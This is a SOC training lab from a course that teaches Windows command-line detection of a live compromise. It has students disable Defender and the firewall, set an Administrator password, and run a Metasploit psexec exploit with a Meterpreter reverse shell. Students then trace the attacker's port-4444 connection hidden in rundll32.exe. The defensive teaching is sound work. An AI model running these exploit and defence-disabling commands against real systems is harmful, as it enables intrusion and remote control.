This is a lab from **John Strand**'s **SOC Core Skills** Course:

# Windows CLI

In this lab, we will create **malware**, run it, and use the tools we went through in the slides to look at what an attack looks like on a live system.  

One of the best ways to learn is to actually just dig in and do it.  






- Open **Ubuntu Shell**

Before going any further, we need to ensure that **Windows Defender** is disabled. To do this, open a Windows **Powershell** by clicking the icon in the taskbar.


<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/be17e180-e1a4-4b42-b537-9b2931ac0284" />



```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

>[!NOTE]
>
>If you get red errors that say 
><pre>A general error occurred that is not covered by a more specific error code.</pre> 
>
>That is OK!  It means **Defender** was already disabled. </br>
>We run the above command to ensure that it is off for this lab.  It has a sneaky way of turning back on again...

Next, lets ensure the firewall is disabled.

```ps
netsh advfirewall set allprofiles state off
```

Next, set a password for the Administrator account that you can remember

```ps
net user Administrator password1234
```

>[!NOTE]
>
>That is a very bad password. </br> Come up with something better. But, please remember it.

Let's get our **Windows IP**:

```ps
ipconfig
```

<img width="629" height="253" alt="2026-03-15_23-42" src="https://github.com/user-attachments/assets/6a8b012f-cd92-47fd-8f0d-eac30d124877" />

Now head back to your **Linux** terminal.

We need to gain root access. To do that, run the following command:

```bash
sudo su -
```

Next, we will start the **Metasploit** handler with the following command:

```bash
msfconsole -q
```

It will take a second to connect, be patient!

When connected, our terminal will look like this.

<img width="62" height="41" alt="2026-03-15_23-29" src="https://github.com/user-attachments/assets/1595387c-029b-462c-90dd-4430c0856bed" />

Next, run the following command:

```bash
use exploit/windows/smb/psexec
```

<img width="677" height="88" alt="2026-03-15_23-36" src="https://github.com/user-attachments/assets/3918ae2d-9018-46e0-9e63-41536cafed35" />

We will continue by running this command to set the location of the payload:

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

We also need to set the **RHOST IP** for the Windows system by using the following command:

```bash
set RHOST <Your Windows System's IP Address>
```

<img width="711" height="108" alt="2026-03-15_23-39" src="https://github.com/user-attachments/assets/68a2b59f-01ae-4500-88cc-563275be4cb7" />

Next, we need to set the **SMB** username and password. 

```bash
set SMBUSER Administrator
```

```bash
set SMBPASS password1234
```

>[!NOTE]
>
>This will be the password you set earlier. </br>
>Hopefully your password is different than mine!

It should look like this:

<img width="556" height="81" alt="2026-03-15_23-40" src="https://github.com/user-attachments/assets/293e8c74-5e42-4108-b52e-b94f48536cdb" />

Now let's set the target to upload a **Raw Executable** instead of a **PowerShell Script**

```bash
show targets
```

```bash
set TARGET 2
```

<img width="456" height="344" alt="2026-03-15_23-56" src="https://github.com/user-attachments/assets/1554429f-fa6a-43e9-b202-bc32c8356223" />

Now, we can run the exploit command

```bash
exploit
```

<img width="964" height="262" alt="2026-03-15_23-57" src="https://github.com/user-attachments/assets/d49e2fb2-0a0d-4cb3-a4a8-1771dd4f70c4" />

While there is not much here for this lab, it is key to remember that these two commands would help us detect an attacker that is mounting shares on other computers (net view).  It would also tell us if an attacker had mounted a share on this system (net session). 

We are not done with network connections yet.  Lets try looking at our malware!

Go ahead an open an instance of **Windows PowerShell**.

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/be17e180-e1a4-4b42-b537-9b2931ac0284" />

Run the following command:

```ps
netstat -naob
```

<img width="743" height="578" alt="2026-03-16_00-02" src="https://github.com/user-attachments/assets/a30004d5-0d95-4800-93a3-8debde52f3a2" />


Well, that is a lot of data. This is showing us which ports are open on this system **(0.0.0.0:portnumber)** or **(LISTENING)**.
As well as the remote connections that are made to other systems **(ESTABLISHED)**.  In this example, we are really interested in the **ESTABLISHED** connections:

```ps
netstat -naob | findstr ESTABLISHED
```

<img width="945" height="387" alt="2026-03-16_00-01" src="https://github.com/user-attachments/assets/4bb6bd11-5df0-4d05-8120-1a80c4c2bdf8" />

Specificly, we are interested in the connection on **port 4444** as we know this is the port we used for our malware.



Let's get the Process ID **(PID)** from the output of our **"netstat -naob"** command that we ran earlier so we can dig a little deeper.

>[!TIP]
>
>Look for port **4444**, it is the number right after `ESTABLISHED`

We will start with tasklist  

```ps
tasklist /m /fi "pid eq [PID]"
```

>[!NOTE]
>
>**YOUR PID WILL BE DIFFERENT!**

<img width="741" height="232" alt="2026-03-16_00-11" src="https://github.com/user-attachments/assets/c8e34f5e-41d5-48b8-967e-9ebf6da6aae6" />

We can see the loaded **DLL's** above.  As we can see, there is not a whole lot to see here:

Let's keep digging with **wmic**:

```bash
(Get-WmiObject Win32_Process -Filter "ProcessId=[PID]").CommandLine
```

<img width="858" height="44" alt="2026-03-16_00-24" src="https://github.com/user-attachments/assets/b8ccc4ee-3b90-4aaa-a4e4-b83e501aed71" />

A perfectly normal **Windows DLL**... or so it would seem... once **Meterpreter** loads, it overwrites its own process command line in memory as an evasion technique. This is intentional anti-forensics behavior built into Meterpreter, and so, here, it spawns as `rundll32.exe` - a trusted **Windows Process**

To try to dig deeper, let's print every process making a network connection, a pretty hefty command:

```bash
Get-NetTCPConnection -State Established | ForEach-Object {
    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Process = $proc.Name
        PID = $_.OwningProcess
        LocalPort = $_.LocalPort
        RemoteAddress = $_.RemoteAddress
        RemotePort = $_.RemotePort
    }
}
```

<img width="970" height="567" alt="1" src="https://github.com/user-attachments/assets/1b6d9e19-cf31-42ad-aa3a-0d4c91f68783" />

Scroll until you see `rundll32.exe`

<img width="322" height="113" alt="2" src="https://github.com/user-attachments/assets/1873ffbb-ef95-42ff-8499-c32b5bfe586c" />

HA!! An outbound connection to the **attacker**!!!

Lets go through the steps we took to hunt for a malicious process

1. We looked for **ESTABLISHED** connections

2. We did a search on that **process ID**

3. We saw the connection was made by a **Trusted Windows Process**

4. We dug deeper to see all processes making connections, and confirmed our suspicions that the **process** was used **maliciously**, because `rundll32.exe` should never be making outbound **TCP connections**
